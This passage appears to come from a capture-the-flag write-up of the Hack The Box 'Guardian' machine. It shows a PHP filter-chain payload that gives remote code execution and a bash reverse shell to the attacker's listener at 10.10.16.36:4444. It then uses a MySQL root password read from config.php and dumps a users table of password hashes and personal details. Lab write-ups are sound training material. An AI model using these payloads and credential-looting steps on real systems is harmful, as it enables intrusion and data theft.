php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Now copy paste and send to see if we can see the `id`.

![Guardian Admin Reports](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_admin-reports-6.png)

There we go, got our result, now let's leverage this point to reverse shell.

> *Remeber to add `,system.php` at the end incase forgot it and it will not working :)*

```bash
└─$ python3 php_filter_chain_generator.py --chain '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.16.36/4444 0>&1'\''");?>'
[+] The following gadget chain will generate the following code : <?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.36/4444 0>&1'");?> (base64 value: PD9waHAgc3lzdGVtKCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjM2LzQ0NDQgMD4mMSciKTs/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Setup our kali server via [penelope](https://github.com/brightio/penelope).

```bash
└─$ penelope -p 4444                                                                                                            
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.36
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Copy the output and paste and send it.

```bash
└─$ penelope -p 4444                                                                                                            
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.36
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from guardian~10.129.101.248-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/guardian~10.129.101.248-Linux-x86_64/2025_09_01-09_15_08-425.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@guardian:~/portal.guardian.htb/admin$
```

Got our reverse shell as `www-data`. <br>
&rarr; Let's go around to see if we can got something.

```bash
www-data@guardian:~/portal.guardian.htb/admin$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

So there was port `3306` open and we also see from the source code the `config.php` contain credentials so we can levearge this to access `mysql`.

![Guardian Config Source Code](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_config-source-code.png)

### MySQL
Let's access `mysql`.

```bash
www-data@guardian:~$ mysql -h 127.0.0.1 -u root -pGu4rd14n_un1_1s_th3_b3st guardiandb
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1276
Server version: 8.0.43-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Checking the database.

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| guardiandb         |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
```

Interesting in `guardiandb`, let's use this database and checking tables.

```bash
mysql> use guardiandb;
Database changed
mysql> show tables;
+----------------------+
| Tables_in_guardiandb |
+----------------------+
| assignments          |
| courses              |
| enrollments          |
| grades               |
| messages             |
| notices              |
| programs             |
| submissions          |
| users                |
+----------------------+
9 rows in set (0.00 sec)
```

Let's head into `users` table.

```bash
mysql> select * from users;
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
| user_id | username           | password_hash                                                    | full_name            | email                           | dob        | address                                                                       | user_role | status | created_at          | updated_at          |
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
|       1 | admin              | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 | System Admin         | admin@guardian.htb              | 2003-04-09 | 2625 Castlegate Court, Garden Grove, California, United States, 92645         | admin     | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|       2 | jamil.enockson     | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 | Jamil Enocksson      | jamil.enockson@guardian.htb     | 1999-09-26 | 1061 Keckonen Drive, Detroit, Michigan, United States, 48295                  | admin     | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|       3 | mark.pargetter     | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e | Mark Pargetter       | mark.pargetter@guardian.htb     | 1996-04-06 | 7402 Santee Place, Buffalo, New York, United States, 14210                    | admin     | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|       4 | valentijn.temby    | 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6 | Valentijn Temby      | valentijn.temby@guardian.htb    | 1994-05-06 | 7429 Gustavsen Road, Houston, Texas, United States, 77218                     | lecturer  | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|       5 | leyla.rippin       | 7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61 | Leyla Rippin         | leyla.rippin@guardian.htb       | 1999-01-30 | 7911 Tampico Place, Columbia, Missouri, United States, 65218                  | lecturer  | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|       6 | perkin.fillon      | 4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471 | Perkin Fillon        | perkin.fillon@guardian.htb      | 1991-03-19 | 3225 Olanta Drive, Atlanta, Georgia, United States, 30368                     | lecturer  | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|       7 | cyrus.booth        | 23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6 | Cyrus Booth          | cyrus.booth@guardian.htb        | 2001-04-03 | 4214 Dwight Drive, Ocala, Florida, United States, 34474                       | lecturer  | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|       8 | sammy.treat        | c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2 | Sammy Treat          | sammy.treat@guardian.htb        | 1997-03-26 | 13188 Mount Croghan Trail, Houston, Texas, United States, 77085               | lecturer  | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|       9 | crin.hambidge      | 9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75 | Crin Hambidge        | crin.hambidge@guardian.htb      | 1997-09-28 | 4884 Adrienne Way, Flint, Michigan, United States, 48555                      | lecturer  | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
|      10 | myra.galsworthy    | ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4 | Myra Galsworthy      | myra.galsworthy@guardian.htb    | 1992-02-20 | 13136 Schoenfeldt Street, Odessa, Texas, United States, 79769                 | lecturer  | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
